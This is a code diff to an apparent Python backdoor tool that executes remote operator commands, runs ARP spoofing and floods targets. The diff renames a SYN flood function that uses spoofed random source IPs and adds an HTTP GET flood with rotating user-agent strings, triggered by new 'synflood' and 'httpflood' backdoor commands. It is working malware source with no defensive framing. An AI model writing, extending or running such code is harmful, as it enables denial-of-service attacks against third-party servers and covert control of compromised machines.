@@ -15,6 +15,15 @@ import netfilterqueue
 import random
 
 
+user_agent_list = [
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
+]
+
+
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
@@ -254,7 +263,7 @@ def randomize_integer():
     return random_int
 
 
-def flooding_tcp(port):
+def syn_flooding(port):
     for _ in range(flood_time):
         ip_packet = scapy.IP()
         ip_packet.src = randomize_ip()
@@ -268,6 +277,16 @@ def flooding_tcp(port):
         tcp_packet.window = randomize_integer()
 
         scapy.send(ip_packet/tcp_packet, verbose=False)
+
+
+def http_flooding(flood_ip, times):
+    for _ in range(times):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((flood_ip, 80))
+        s.send("GET / HTTP/1.1\r\n".encode())
+        s.send("Host: {}\r\n".format(flood_ip).encode())
+        s.send("User-Agent: {}\r\n\r\n".format(choice(user_agent_list)).encode())
+        s.close()
 
 
 class Backdoor:
@@ -378,7 +397,7 @@ class Backdoor:
                                 print('[-] No arp spoof running at the moment.')
                         except NameError:
                             print('[-] No arp spoof running at the moment.')
-                    elif command[0] == "tcpflood":
+                    elif command[0] == "synflood":
                         # try:
                         global flood_ip
                         global flood_time
@@ -386,9 +405,16 @@ class Backdoor:
                         flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
                         flood_time = int(command[3])
                         pool = multiprocessing.Pool(processes=len(flood_ports))
-                        pool.map(flooding_tcp, flood_ports)
+                        pool.map(syn_flooding, flood_ports)
                         pool.close()
                         pool.join()
+                        # except:
+                        #     pass
+                    elif command[0] == "httpflood":
+                        # try:
+                        flood_ip = command[1]
+                        flood_time = int(command[2])
+                        http_flooding(flood_ip, flood_time)
                         # except:
                         #     pass
                     elif command[0] == "killarp":
